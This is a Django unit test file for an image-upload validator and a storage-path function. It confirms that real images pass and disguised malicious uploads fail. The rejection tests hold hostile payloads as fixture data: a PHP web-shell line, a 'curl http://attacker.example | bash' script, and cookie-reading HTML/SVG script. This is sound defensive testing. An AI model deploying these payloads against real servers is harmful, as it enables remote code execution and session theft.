from unittest import mock

from django.core.exceptions import ValidationError
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import SimpleTestCase

from voteit.core.models import user_image_upload_to
from voteit.core.validators import ImageValidator

# Minimal but structurally valid images recognised correctly by libmagic.
# JPEG: SOI + JFIF APP0 marker + EOI
_JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"
# PNG: signature + IHDR (1×1 px, RGB) + minimal IDAT + IEND, all CRCs intact
_PNG = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
    b"\x00\x00\x00\x0cIDATx\x9cc```\x00\x00\x00\x04\x00\x01\xf6\x178U"
    b"\x00\x00\x00\x00IEND\xaeB`\x82"
)
# WebP: minimal RIFF/WEBP header (libmagic may fall back to signature check on macOS)
_WEBP = b"RIFF\x04\x00\x00\x00WEBP"
# GIF89a — valid image format intentionally excluded from the allowed list
_GIF = b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"


def _upload(content: bytes, name: str = "test.jpg") -> SimpleUploadedFile:
    return SimpleUploadedFile(name, content, content_type="application/octet-stream")


class ImageValidatorTests(SimpleTestCase):
    def setUp(self):
        self.v = ImageValidator()

    # — Accepted formats —

    def test_jpeg_accepted(self):
        self.v(_upload(_JPEG, "photo.jpg"))

    def test_png_accepted(self):
        self.v(_upload(_PNG, "photo.png"))

    def test_webp_accepted(self):
        self.v(_upload(_WEBP, "photo.webp"))

    # — File size —

    def test_file_exceeding_max_size_rejected(self):
        v = ImageValidator(max_size=10)
        with self.assertRaises(ValidationError) as ctx:
            v(_upload(b"x" * 11))
        self.assertIn("too large", str(ctx.exception).lower())

    def test_file_at_exact_max_size_accepted(self):
        v = ImageValidator(max_size=len(_JPEG))
        v(_upload(_JPEG))

    # — Malicious and unsupported content —

    def test_plain_text_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(b"just plain text content", "photo.jpg"))

    def test_html_with_script_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(
                b"<html><body><script>document.cookie</script></body></html>",
                "photo.jpg",
            ))

    def test_svg_with_embedded_script_rejected(self):
        # SVG can execute JavaScript when rendered — must be rejected
        svg = (
            b'<?xml version="1.0"?>'
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b"<script>alert(document.cookie)</script>"
            b"</svg>"
        )
        with self.assertRaises(ValidationError):
            self.v(_upload(svg, "photo.svg"))

    def test_php_code_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(b"<?php system($_GET['cmd']); ?>", "photo.jpg"))

    def test_shell_script_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(
                b"#!/bin/bash\ncurl http://attacker.example | bash\n",
                "photo.jpg",
            ))

    def test_elf_binary_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(b"\x7fELF" + b"\x00" * 100, "photo.jpg"))

    def test_gif_rejected(self):
        # GIF is a real image format but excluded from the allowed list
        with self.assertRaises(ValidationError):
            self.v(_upload(_GIF, "photo.gif"))

    def test_zip_archive_rejected(self):
        # PK zip signature — covers zip bombs disguised as images
        with self.assertRaises(ValidationError):
            self.v(_upload(b"PK\x03\x04" + b"\x00" * 100, "photo.jpg"))

    # — Extension is ignored; MIME from file content is authoritative —
    # This ensures that renaming a malicious file to .jpg does not bypass the check.

    def test_jpeg_content_with_png_extension_accepted(self):
        self.v(_upload(_JPEG, "photo.png"))

    def test_php_content_with_jpeg_extension_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(b"<?php echo 'pwned'; ?>", "photo.jpg"))

    def test_html_content_with_webp_extension_rejected(self):
        with self.assertRaises(ValidationError):
            self.v(_upload(b"<script>alert(1)</script>", "photo.webp"))

    # — Stream position is restored so Django's storage backend can save the file —

    def test_stream_rewound_after_successful_validation(self):
        f = _upload(_JPEG)
        self.v(f)
        self.assertEqual(f.tell(), 0)

    def test_stream_rewound_after_mime_rejection(self):
        f = _upload(b"not an image", "photo.jpg")
        with self.assertRaises(ValidationError):
            self.v(f)
        self.assertEqual(f.tell(), 0)

    # — Custom validator parameters —

    def test_custom_max_size_enforced(self):
        v = ImageValidator(max_size=5)
        with self.assertRaises(ValidationError):
            v(_upload(b"x" * 6))

    def test_custom_allowed_mimes_can_accept_gif(self):
        v = ImageValidator(allowed_mimes=("image/gif",))
        v(_upload(_GIF, "photo.gif"))

    def test_custom_allowed_mimes_excludes_jpeg(self):
        v = ImageValidator(allowed_mimes=("image/gif",))
        with self.assertRaises(ValidationError):
            v(_upload(_JPEG, "photo.jpg"))

    # — Filename correction from detected MIME type —

    def test_blob_filename_corrected_to_jpeg_extension(self):
        f = _upload(_JPEG, "blob")
        self.v(f)
        self.assertTrue(f.name.endswith(".jpg"), f.name)

    def test_blob_filename_corrected_to_png_extension(self):
        f = _upload(_PNG, "blob")
        self.v(f)
        self.assertTrue(f.name.endswith(".png"), f.name)

    def test_blob_filename_corrected_to_webp_extension(self):
        f = _upload(_WEBP, "blob")
        self.v(f)
        self.assertTrue(f.name.endswith(".webp"), f.name)

    def test_wrong_extension_corrected_to_detected_type(self):
        f = _upload(_JPEG, "photo.png")
        self.v(f)
        self.assertTrue(f.name.endswith(".jpg"), f.name)


class UserImageUploadToTests(SimpleTestCase):
    def _instance(self, organisation_id):
        obj = mock.Mock()
        obj.organisation_id = organisation_id
        return obj

    def test_path_is_scoped_to_org_directory(self):
        path = user_image_upload_to(self._instance(42), "photo.jpg")
        self.assertTrue(path.startswith("org_42/images/"), path)

    def test_path_preserves_jpeg_extension(self):
        path = user_image_upload_to(self._instance(1), "photo.jpg")
        self.assertTrue(path.endswith(".jpg"), path)

    def test_path_preserves_webp_extension(self):
        path = user_image_upload_to(self._instance(1), "photo.webp")
        self.assertTrue(path.endswith(".webp"), path)

    def test_path_preserves_png_extension(self):
        path = user_image_upload_to(self._instance(1), "photo.PNG")
        self.assertTrue(path.endswith(".png"), path)

    def test_fallback_dir_when_no_organisation(self):
        path = user_image_upload_to(self._instance(None), "photo.jpg")
        self.assertTrue(path.startswith("no_org/images/"), path)

    def test_php_extension_replaced_with_bin(self):
        path = user_image_upload_to(self._instance(1), "photo.php")
        self.assertTrue(path.endswith(".bin"), path)

    def test_htaccess_extension_replaced_with_bin(self):
        path = user_image_upload_to(self._instance(1), "photo.htaccess")
        self.assertTrue(path.endswith(".bin"), path)

    def test_unknown_extension_replaced_with_bin(self):
        path = user_image_upload_to(self._instance(1), "photo.xyz")
        self.assertTrue(path.endswith(".bin"), path)

    def test_no_extension_gets_bin(self):
        path = user_image_upload_to(self._instance(1), "photowithoutext")
        self.assertTrue(path.endswith(".bin"), path)

    def test_filename_is_uuid_not_original(self):
        path = user_image_upload_to(self._instance(1), "my-secret-name.jpg")
        filename = path.split("/")[-1]
        self.assertNotIn("my-secret-name", filename)

    def test_successive_calls_produce_unique_filenames(self):
        instance = self._instance(1)
        paths = {user_image_upload_to(instance, "photo.jpg") for _ in range(10)}
        self.assertEqual(len(paths), 10)
